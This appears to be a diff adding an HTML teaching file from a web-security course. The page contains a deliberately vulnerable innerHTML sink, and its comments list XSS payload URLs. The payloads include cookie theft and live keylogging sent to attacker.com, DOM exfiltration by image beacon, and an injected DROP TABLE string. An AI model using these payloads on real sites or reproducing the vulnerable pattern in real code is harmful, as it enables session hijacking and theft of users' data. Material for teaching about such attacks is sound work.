@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSS Example</title>
+  </head>
+  <body>
+    <div>Welcome, <span id="username"></span>!</div>
+
+    <script>
+      // Function to set a cookie, mostly this will be set from server
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+        const expires = `expires=${date.toUTCString()}`;
+        document.cookie = `${name}=${value};${expires};path=/`;
+      }
+
+      // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
+      setCookie("exampleCookie", "Hello, Cookie!", 7);
+    </script>
+
+    <!-- Vulnerable Code -->
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const name = params.get("name");
+      document.getElementById("username").innerHTML = `${name}`;
+    </script>
+  </body>
+</html>
+
+<!-- XSS Attack -->
+
+<!-- !User Session Hijacking -->
+<!-- This attack allows the attacker to hijack the user's session by exploiting a vulnerability in the web application. -->
+
+<!-- http://127.0.0.1:5500/src/03-security/Vulnerabilities/example-1.html?name=<img src=x onerror="alert('XSS Attack')"> -->
+
+<!-- it only get those cookies which has the httpOnly flag set to `false` (only client side cookies) -->
+<!-- http://127.0.0.1:5500/src/03-security/Vulnerabilities/example-1.html?name=<img src=x onerror="alert(document.cookie)">  -->
+
+<!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/example-1.html?name=<img src=x onerror="fetch('https://attacker.com/api/data',{method:'POST',body:JSON.stringify({data:document.cookie})})">  -->
+
+<!-- !Unauthorized Activities -->
+<!-- This attack allows the attacker to perform unauthorized activities on the victim's account by exploiting a vulnerability in the web application. -->
+
+<!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/example-1.html?name=<img src=x onerror="fetch('https://api.com/get-users',{method:'POST',body:JSON.stringify({data:' ; DROP TABLE users; --})})">  -->
+
+<!-- !Capturing Keystrokes -->
+<!-- With this attack, every key the user types is sent in real-time to the attacker's server, enabling live keylogging of sensitive information like passwords or messages. -->
+
+<!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<img src=x onerror="document.addEventListener('keydown',e=>console.log(e.key))"> -->
+
+<!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<img src=x onerror="document.addEventListener('keydown',e=>fetch('https://attacker.com/api/data',{method:'POST',body:JSON.stringify({data:e.key})}))"> -->
+
+<!-- !DOM exfiltration (Image beacon) -->
+<!-- This attack allows the attacker to exfiltrate the DOM of the victim's page, including the HTML, CSS, and JavaScript code. -->
+
+<!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<img src="empty.gif" onerror="new Image().src=`https://attacker.com?output=${document.body.innerHTML}`"> -->
